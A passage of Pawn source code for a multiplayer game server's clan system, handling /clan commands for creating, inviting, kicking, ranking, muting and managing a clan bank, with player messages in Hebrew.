if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
tmp = strtok(cmdtext, idx);
format(file,256,"Clans/%s.ini",tmp);
new date[20];
new year,month,day;	getdate(year, month, day);
format(date, sizeof(date), "%d/%d/%d",day,month,year);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp))return SendClientMessage(playerid,WHITE, "Usage: /clan create [name]");
if(strlen(tmp) > 10 || strlen(tmp) < 2)return SendClientMessage(playerid,red, ".שם הקלאן חייב להכיל בין 2 ל10 תווים");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") > 0)return SendClientMessage(playerid, red,".את/ה כבר חבר בקלאן רישמי");
if(GetPlayerMoney(playerid) < 100000)return SendClientMessage(playerid,red, ".$על מנת לפתוח קלאן עליך להיות עם סכום של כ 100000");
if(dini_Exists(file))return SendClientMessage(playerid, red,".נרשם כבר קלאן בשם כזה, אנא נסה שם אחר");
LACY_GiveMoney(playerid,-100000);
dini_Create(file);
dini_Set(file,"ClanName",tmp);
dini_Set(file,"Established",date);
dini_Set(file,"EstablishedBy",playername);
dini_IntSet(file,"Leaders",1);
dini_IntSet(file,"SubLeaders",0);
dini_IntSet(file,"Total",1);
dini_IntSet(file,"Bank",0);
dini_Set(file,"Msg","None.");
dini_IntSet(file,"Color1",0);
dini_IntSet(file,"Color2",0);
dini_IntSet(file,"Color3",0);
dini_IntSet(file,"Kills",0);
dini_IntSet(file,"Death",0);
dini_IntSet(file,"skin",0);
dini_IntSet(file,"chat",0);
dini_IntSet(file,"OpenTest",1);
dini_Set(GetPlayerFile(playerid), "Clan",tmp);
dini_IntSet(GetPlayerFile(playerid), "ClanLvl",3);
format(strings, sizeof(strings), "/clan :לקבלת עזרה \"%s\" :יצרת קלאן חדש בשם",dini_Get(file,"ClanName")); //tmp
SendClientMessage(playerid, COLOR_LIGHTGREEN,strings);

return 1;
}

if(strcmp(Roy_Killer,"kick",true) == 0)
{
new pidName[24];
new pid, tmpp[256];
tmpp = strtok(cmdtext, idx);
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(!strlen(tmpp))return SendClientMessage(playerid,WHITE, "Usage: /clan kick [id/name]");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 3)return ClanError(playerid,2);
if(!IsNumeric(tmpp)) pid = ReturnPlayerID(tmpp); else pid = strval(tmpp);
if(3 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if (!(IsPlayerConnected(pid)))return SendClientMessage(playerid,red, ".השחקן אינו מחובר");
GetPlayerName(pid, pidName, sizeof(pidName));
if(strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),    dini_Get(GetPlayerFile(pid),"Clan"),true))return SendClientMessage(playerid,red, ".השחקן אינו חבר בקלאן שלך");
if(strfind(dini_Get(GetPlayerFile(pid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(pid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(pid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".שחקן זה לא חבר בשום קלאן");
if(pid == playerid)return SendClientMessage(playerid,red, ".אינך יכול להעיף את עצמך מהקלאן");
format(strings, sizeof(strings),".\"%s\" מקלאן %s (ID: %d) הוצאת את",dini_Get(GetPlayerFile(pid),"Clan"),pidName,pid); //tmp
SendClientMessage(playerid, 0xF06E8DFF,strings);
format(strings, sizeof(strings),".\"%s\" הוציא אותך מקלאן %s (ID: %d)",dini_Get(GetPlayerFile(playerid),"Clan"),playername,playerid); //tmp
SendClientMessage(pid, 0xF06E8DFF,strings);
format(file,256,"Clans/%s.ini",    dini_Get(GetPlayerFile(playerid),"Clan"));
dini_IntSet(file,"Total",dini_Int(file,"Total")-1);
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(i != playerid && !strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
format(strings,sizeof(strings),".\"%s\" הוצא מהקלאן על ידי %s",playername,pidName);
SendClientMessage(i,red,strings);
}
}
dini_Set(GetPlayerFile(pid), "Clan","None.");
dini_IntSet(GetPlayerFile(pid), "ClanLvl",0);
return 1;
}
//==
//==
if(strcmp(Roy_Killer,"bank",true) == 0)
{
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 3)return ClanError(playerid,3);
new Mr_Joe[256];
Mr_Joe= strtok(cmdtext, idx);
if(20 < strlen(Mr_Joe)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Mr_Joe)) return SendClientMessage(playerid,WHITE,"Usage: /clan bank [lock/unlock/maxwithdraw]");

if(strcmp(Mr_Joe,"maxwithdraw",true) == 0)
{
new max_withdraw_tmp[256];
max_withdraw_tmp = strtok(cmdtext,idx);
if(!strlen(max_withdraw_tmp)) return SendClientMessage(playerid,WHITE,"Usage: /clan bank maxwithdraw [max-withdraw]");
format(file,256,"Clans/%s.ini",	 dini_Get(GetPlayerFile(playerid),"Clan"));
dini_IntSet(file,"CMaxWithdaw",strval(max_withdraw_tmp));
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
format(strings,sizeof(strings),".%d$ :שינה את המקסימום סכום משיכה מהבנק ל %s - הלידר",strval(max_withdraw_tmp),GetName(playerid));
SendClientMessage(i,red,strings);
}
}

return true;
}

if(strcmp(Mr_Joe,"lock",true) == 0)
{
format(file,256,"Clans/%s.ini",	 dini_Get(GetPlayerFile(playerid),"Clan"));
if(dini_Int(file,"CLock") == 1) return SendClientMessage(playerid,red,".הקלאן בנק נעול כבר");
dini_IntSet(file,"CLock",1);
for(new i = 0; i < GetMaxPlayers() ; i++){
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true)){
format(strings,sizeof(strings),".נעל את הקלאן בנק %s - הלידר",GetName(playerid));
SendClientMessage(i,red,strings);
}}

return true;
}

else if(strcmp(Mr_Joe,"unlock",true) == 0)
{
format(file,256,"Clans/%s.ini",	 dini_Get(GetPlayerFile(playerid),"Clan"));
if(dini_Int(file,"CLock") == 0) return SendClientMessage(playerid,red,".הקלאן בנק פתוח כבר");
dini_IntSet(file,"CLock",0);

for(new i = 0; i < GetMaxPlayers() ; i++){
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true)){
format(strings,sizeof(strings),".פתח את הקלאן בנק %s - הלידר",GetName(playerid));
SendClientMessage(i,COLOR_LIGHTGREEN,strings);
}}
return true;
}

return SendClientMessage(playerid,red,".אפשרות קלאן בנק שגויה");
}


if(strcmp(Roy_Killer,"edit",true) == 0)
{
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 2)return ClanError(playerid,2);
new Mr_Joe[256];
Mr_Joe= strtok(cmdtext, idx);
if(20 < strlen(Mr_Joe)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Mr_Joe)) return SendClientMessage(playerid,WHITE,"Usage: /clan edit [sm/skin/mute/unmute/tests]");

if(strcmp(Mr_Joe,"tests",true) == 0)
{
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
format(file,256,"Clans/%s.ini",	 dini_Get(GetPlayerFile(playerid),"Clan"));
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 2)return ClanError(playerid,2);

if(dini_Int(file,"OpenTest") == 0)
{
dini_IntSet(file,"OpenTest",1);
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
format(strings,sizeof(strings),".פתח את הקלאן לטסטים %s הסגן לידר",GetName(playerid));
SendClientMessage(i,COLOR_LIGHTGREEN,strings);
}}}

else if(dini_Int(file,"OpenTest") == 1)
{
dini_IntSet(file,"OpenTest",0);
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
format(strings,sizeof(strings),".סגר את הקלאן לטסטים %s הסגן לידר",GetName(playerid));
SendClientMessage(i,red,strings);
}}}

return true;
}

if(strcmp(Mr_Joe,"SM",true) == 0)
{
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
format(file,256,"Clans/%s.ini",	 dini_Get(GetPlayerFile(playerid),"Clan"));
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 2)return ClanError(playerid,2);

new length = strlen(cmdtext);
while ((idx < length) && (cmdtext[idx] <= ' '))
{
idx++;
}
new offset = idx;
new result[256];
while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
{
result[idx - offset] = cmdtext[idx];
idx++;
}
result[idx - offset] = EOS;
if(25 < strlen(result)) return true;
if(!strlen(result)) return SendClientMessage(playerid,COLOR_WHITE, "Usage: /clan edit sm [text]");

format(strings, sizeof(strings), "Message: \"%s\"",result); //tmp
SendClientMessage(playerid, 0x0EDC8FF,strings);
dini_Set(file,"Msg",result);
return 1;
}


else if(strcmp(Mr_Joe,"skin",true) == 0)
{
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true))return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 3)return ClanError(playerid,3);
format(file,256,"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
dini_IntSet(file,"skin",GetPlayerSkin(playerid));
format(strings, sizeof(strings), "Skin Clan Change to %d by leader - %s. מעכשיו כל ספון יוחלף הסקין למה שהליד בחר",GetPlayerSkin(playerid),GetName(playerid)); //tmp

for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
if(dini_Int(GetPlayerFile(i), "ClanLvl") > 0)
{
SendClientMessage(i,lblue,strings);
}
}
}
return 1;
}

if(strcmp(Mr_Joe,"mute",true) == 0)
{
new pidName[24];
new pid, tmpp[256];
tmpp = strtok(cmdtext, idx);
if(20 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(!strlen(tmpp))return SendClientMessage(playerid,WHITE, "Usage: /clan edit mute [id/name]");
if(3 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 2)return ClanError(playerid,3);
if(!IsNumeric(tmpp)) pid = ReturnPlayerID(tmpp); else pid = strval(tmpp);
if(3 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if (!(IsPlayerConnected(pid)))return SendClientMessage(playerid,red, ".השחקן אינו מחובר");
GetPlayerName(pid, pidName, sizeof(pidName));
if(strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),    dini_Get(GetPlayerFile(pid),"Clan"),true))return SendClientMessage(playerid,red, ".השחקן אינו חבר בקלאן שלך");
if(strfind(dini_Get(GetPlayerFile(pid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(pid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(pid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".שחקן זה לא חבר בשום קלאן");
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(    dini_Get(GetPlayerFile(playerid),"Clan"),    dini_Get(GetPlayerFile(i),"Clan"),true))
{
format(strings,sizeof(strings),".%s קיבל מיוט על הצ'אט קלאן על ידי %s",GetName(playerid),pidName);
SendClientMessage(i,red,strings);
}}
ClanMute[pid] = 1;
return 1;
}




if(strcmp(Mr_Joe,"unmute",true) == 0)
{
new pidName[24];
new pid, tmpp[256];
tmpp = strtok(cmdtext, idx);
if(20 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(!strlen(tmpp))return SendClientMessage(playerid,COLOR_WHITE, "Usage: /clan edit unmute [id/name]");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 2)return ClanError(playerid,3);
if(!IsNumeric(tmpp)) pid = ReturnPlayerID(tmpp); else pid = strval(tmpp);
if (!(IsPlayerConnected(pid)))return SendClientMessage(playerid,red, ".השחקן אינו מחובר");
if(3 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
GetPlayerName(pid, pidName, sizeof(pidName));
if(ClanMute[pid] == 0) return SendClientMessage(playerid,WHITE,".שחקן זה לא במיוט בקלאן שלך");
if(strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),    dini_Get(GetPlayerFile(pid),"Clan"),true))return SendClientMessage(playerid,red, ".השחקן אינו חבר בקלאן שלך");
if(strfind(dini_Get(GetPlayerFile(pid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(pid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(pid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".שחקן זה לא חבר בשום קלאן");

for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(    dini_Get(GetPlayerFile(playerid),"Clan"),    dini_Get(GetPlayerFile(i),"Clan"),true))
{
format(strings,sizeof(strings),".%s הוריד מיוט ל %s",pidName,playername);
SendClientMessage(i,red,strings);
}}
ClanMute[pid] = 0;
return 1;
}

if(strcmp(Mr_Joe,"chat",true) == 0)
{
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true))return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 3)return ClanError(playerid,3);
format(file,256,"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
if(dini_Int(file,"chat") == 0)
{
format(strings, sizeof(strings), ".נעל את הצ'אט קלאן %s :הלידר",GetName(playerid)); //tmp
dini_IntSet(file,"chat",1);
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
if(dini_Int(GetPlayerFile(i), "ClanLvl") > 0)
{
SendClientMessage(i,red,strings);
}
}
}
}


else if(dini_Int(file,"chat") == 1)
{
format(strings, sizeof(strings), ".פתח את הצ'אט קלאן  %s :הלידר",GetName(playerid)); //tmp
dini_IntSet(file,"chat",0);
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
if(dini_Int(GetPlayerFile(i), "ClanLvl") > 0)
{
SendClientMessage(i,red,strings);
}
}
}
}
return 1;
}


return SendClientMessage(playerid,red,"עריכת קלאן שגויה");
}

if(strcmp(Roy_Killer,"setlevel",true) == 0)
{
new pidName[24];
new pid,lvl, tmpp[256];
tmpp = strtok(cmdtext, idx);
if(20 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(!strlen(tmpp))return SendClientMessage(playerid,COLOR_WHITE,"Usage: /clan setlevel [id/name] [1 - tester | 2 - viceleader | 3 - leader]");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 3)return ClanError(playerid,3);
if(!IsNumeric(tmpp)) pid = ReturnPlayerID(tmpp); else pid = strval(tmpp);
if(3 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if (!(IsPlayerConnected(pid)))return SendClientMessage(playerid,red, ".השחקן אינו מחובר");
GetPlayerName(pid, pidName, sizeof(pidName));
if(strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),	 dini_Get(GetPlayerFile(pid),"Clan"),true))return SendClientMessage(playerid,red, ".השחקן אינו חבר בקלאן שלך");
if(pid == playerid)return SendClientMessage(playerid,red,".אינך יכול לערוך את רמתך בקלאן");
tmpp = strtok(cmdtext, idx);
if(3 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmpp))return SendClientMessage(playerid,COLOR_WHITE,"Usage: /clan setlevel [id/name] [1 - tester | 2 - viceleader | 3 - leader]");
lvl = strval(tmpp);
if(lvl > 4) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(lvl < 1 || lvl > 4)return SendClientMessage(playerid,COLOR_WHITE,"Usage: /clan setlevel [id/name] [1 - tester | 2 - viceleader | 3 - leader]");
if(lvl == 1 && dini_Int(GetPlayerFile(pid),"ClanLvl") == 3) dini_IntSet(file,"Leaders",dini_Int(file,"Leaders")-1);
if(lvl == 2 && dini_Int(GetPlayerFile(pid),"ClanLvl") == 3) dini_IntSet(file,"Leaders",dini_Int(file,"Leaders")-1),dini_IntSet(file,"SubLeaders",dini_Int(file,"SubLeaders")+1);
if(lvl == 1 && dini_Int(GetPlayerFile(pid),"ClanLvl") == 2) dini_IntSet(file,"SubLeaders",dini_Int(file,"SubLeaders")-1);
if(lvl == 3 && dini_Int(GetPlayerFile(pid),"ClanLvl") == 2) dini_IntSet(file,"Leaders",dini_Int(file,"Leaders")+1),dini_IntSet(file,"SubLeaders",dini_Int(file,"SubLeaders")-1);
if(lvl == 3 && dini_Int(GetPlayerFile(pid),"ClanLvl") == 1) dini_IntSet(file,"Leaders",dini_Int(file,"Leaders")+1);
if(lvl == 2 && dini_Int(GetPlayerFile(pid),"ClanLvl") == 1) dini_IntSet(file,"Leaders",dini_Int(file,"SubLeaders")+1);
dini_IntSet(GetPlayerFile(pid), "ClanLvl",lvl);
format(strings, sizeof(strings),".%d ל %s (ID :%d) העלת את רמת הקלאן של",dini_Int(GetPlayerFile(pid),"ClanLvl"),pidName,pid); //tmp
SendClientMessage(playerid, 0x0EDC8FF,strings);
format(strings, sizeof(strings),".%d - שם את רמתך בקלאן %s (ID: %d)",dini_Int(GetPlayerFile(pid),"ClanLvl"),playername,playerid); //tmp
SendClientMessage(pid, 0x0EDC8FF,strings);
return 1;
}

if(strcmp(Roy_Killer,"info",true) == 0)
{
new Mr_Joe[256];
Mr_Joe= strtok(cmdtext, idx);
if(!strlen(Mr_Joe))return SendClientMessage(playerid, COLOR_WHITE, "Usage: /clan info [details/stats/players] [clan-name]");
if(20 < strlen(Mr_Joe)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

if(strcmp(Mr_Joe,"details",true) == 0)
{
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
format(file,256,"Clans/%s.ini",tmp);
if(!strlen(tmp))return SendClientMessage(playerid, COLOR_WHITE, "Usage: /clan info details [clan-name]");
if(!dini_Exists(file))return SendClientMessage(playerid, red,".לא נרשם קלאן בשם כזה");

format(strings, sizeof(strings), "~~~ :\"%s\" - מידע עבור הקלאן ~~~",tmp);
SendClientMessage(playerid, lblue,strings);
format(strings, sizeof(strings), "Open Date: \"%s\" | Erector By \"%s\"",dini_Get(file,"Established"),dini_Get(file,"EstablishedBy"));
SendClientMessage(playerid,COLOR_YELLOW,strings);
format(strings, sizeof(strings),  "ViceLeaders: %d | Leaders: %d | Players: %d ",dini_Int(file,"SubLeaders"),dini_Int(file,"Leaders"),dini_Int(file,"Total"));
SendClientMessage(playerid,COLOR_YELLOW,strings);

format(strings, sizeof(strings), "Clan Message: \"%s\" | Clan Skin: %d",dini_Get(file,"Msg"),dini_Int(file,"skin")); //tmp
SendClientMessage(playerid, COLOR_YELLOW,strings);
return true;
}


if(strcmp(Mr_Joe,"stats",true) == 0)
{
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
format(file,256,"Clans/%s.ini",tmp);
if(!strlen(tmp))return SendClientMessage(playerid, COLOR_WHITE, "Usage: /clan info stats [clan-name]");
if(!dini_Exists(file))return SendClientMessage(playerid, red,".לא נרשם קלאן בשם כזה");

format(strings, sizeof(strings), "~~~ :\"%s\" - הסטאטס של הקלאן ~~~",tmp);
SendClientMessage(playerid, lblue,strings);
new playerscount = 0;
for(new i=0;i<GetMaxPlayers();i++)
{
if(IsPlayerConnected(i) && !strcmp(dini_Get(GetPlayerFile(i),"Clan"),tmp,true))
{
playerscount ++;
}}


format(strings, sizeof(strings),  "%d :מספר השחקנים המחוברים",playerscount);
SendClientMessage(playerid,COLOR_LIGHTGREEN,strings);
if(dini_Int(file,"OpenTest") == 1) SendClientMessage(playerid, COLOR_LIGHTGREEN,"פתוח לטסטים: כן");
if(dini_Int(file,"OpenTest") == 0) SendClientMessage(playerid, COLOR_LIGHTGREEN,"פתוח לטסטים: לא");
format(strings, sizeof(strings),  "%d :כסף בבנק הקלאן",dini_Int(file,"Bank"));
SendClientMessage(playerid,COLOR_LIGHTGREEN,strings);
format(strings, sizeof(strings),  "%d :חישוב הריגות של כל חברי הקלאן מאז הצטרפותם לקלאן",dini_Int(file,"Kills"));
SendClientMessage(playerid,COLOR_LIGHTGREEN,strings);

return true;
}

if(strcmp(Mr_Joe,"players",true) == 0)
{
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
format(file,256,"Clans/%s.ini",tmp);
if(!strlen(tmp))return SendClientMessage(playerid,COLOR_WHITE, "Usage: /clan players [clan-name]");
if(!dini_Exists(file))return SendClientMessage(playerid,red,".לא נרשם קלאן בשם זה");
new playerscount;
format(strings, sizeof(strings),".~~~ :\"%s\" שחקנים של הקלאן~~~",tmp); //tmp
SendClientMessage(playerid,lblue,strings);
for(new i=0;i<GetMaxPlayers();i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(IsPlayerConnected(i) && !strcmp(dini_Get(GetPlayerFile(i),"Clan"),tmp,true))
{
playerscount ++;
format(strings, sizeof(strings),"%d. %s (ID: %d)",playerscount,iname,i); //tmp
SendClientMessage(playerid, COLOR_YELLOW,strings);
}}
if(playerscount == 0) return SendClientMessage(playerid,red,".אין שחקנים מחוברים בקלאן זה");
return 1;
}

return SendClientMessage(playerid,red,".קלאן מידע שגוי");
}

if(strcmp(Roy_Killer,"Leave",true) == 0)
{
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1 || !strcmp(	 dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true))return SendClientMessage(playerid, red,".אתה לא חבר/ה בקלאן");
format(strings, sizeof(strings),".%s יצאת מקלאן",	 dini_Get(GetPlayerFile(playerid),"Clan")); //tmp
SendClientMessage(playerid, COLOR_BRIGHTRED,strings);
format(strings,sizeof(strings),".עזב את הקלאן %s",playername);
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true) && i != playerid)
{
SendClientMessage(i,red,strings);
}
}
format(file,256,"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
dini_IntSet(file,"Total",dini_Int(file,"Total")-1);
dini_Set(GetPlayerFile(playerid), "Clan","None.");
dini_IntSet(GetPlayerFile(playerid), "ClanLvl",0);
return 1;
}


if(strcmp(Roy_Killer,"invite",true) == 0)
{
new pidName[24];
new tmpp[256];
tmpp = strtok(cmdtext, idx);
if(20 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(3 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(!strlen(tmpp))return SendClientMessage(playerid,WHITE, "Usage: /clan invite [id/name]");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 2)return ClanError(playerid,2);
new pid; if(!IsNumeric(tmpp)) pid = ReturnPlayerID(tmpp); else pid = strval(tmpp);
if(3 < strlen(tmpp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if (!(IsPlayerConnected(pid)))return SendClientMessage(playerid,red, ".השחקן אינו מחובר");
if(IsInvited[pid] == 1) return SendClientMessage(playerid,red,".שחקן זה כבר הוזמן לקלאן");
GetPlayerName(pid, pidName, sizeof(pidName));
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1)return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(dini_Int(GetPlayerFile(pid), "ClanLvl") > 0)return SendClientMessage(playerid, red,".שחקן זה כבר חבר/ה בקלאן אחר");
if(pid == playerid)return SendClientMessage(playerid,red, ".אינך יכול להזמין את עצמך לקלאן");
format(strings, sizeof(strings),".\"%s\" להצטרף לקלאן \"%s\" (ID: %d) הזמנת את",dini_Get(GetPlayerFile(playerid),"Clan"),pidName,pid); //tmp
SendClientMessage(playerid, COLOR_LIGHTGREEN,strings);
format(strings, sizeof(strings),".\"%s\" (ID: %d) - על ידי \"%s\" הוזמנת לקלאן",playername,playerid,dini_Get(GetPlayerFile(playerid),"Clan")); //tmp
SendClientMessage(pid, COLOR_LIGHTGREEN,strings);
SendClientMessage(pid, COLOR_LIGHTGREEN,"/clan join - על מנת להצטרף לקלאן, בצע/י *");
IsInvited[pid] = 1;

InviteClanName[pid] = dini_Get(GetPlayerFile(playerid),"Clan");
return 1;
}

if(strcmp(Roy_Killer,"join",true) == 0)
{
if(IsInvited[playerid] == 0)return SendClientMessage(playerid,red,".לא הוזמנת לקלאן");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") > 0)return SendClientMessage(playerid, red,".את/ה כבר חבר בקלאן רישמי");
dini_Set(GetPlayerFile(playerid),"Clan",InviteClanName[playerid]);
dini_IntSet(GetPlayerFile(playerid), "ClanLvl",1);
dini_IntSet(GetPlayerFile(playerid), "ClanLvl",1);
format(file,256,"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
dini_IntSet(file,"Total",dini_Int(file,"Total")+1);
for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(i != playerid && !strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
format(strings,sizeof(strings),".הצטרף לקלאן \"%s\"",playername);
SendClientMessage(i,COLOR_LIGHTGREEN,strings);
}}
format(strings, sizeof(strings),"!בהצלחה \"%s\" הצטרפת לקלאן",dini_Get(GetPlayerFile(playerid),"Clan")); //tmp
SendClientMessage(playerid, COLOR_LIGHTGREEN,strings);
IsInvited[playerid] = 0;
return 1;
}

if(strcmp(Roy_Killer,"color",true) == 0)
{
if(!strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true))return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(dini_Int(GetPlayerFile(playerid), "ClanLvl") < 3)return ClanError(playerid,3);
new colornum[256];
colornum = strtok(cmdtext, idx);
new colornum2[256];
colornum2 = strtok(cmdtext, idx);
new colornum3[256];
colornum3 = strtok(cmdtext, idx);
if(20 < strlen(colornum)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
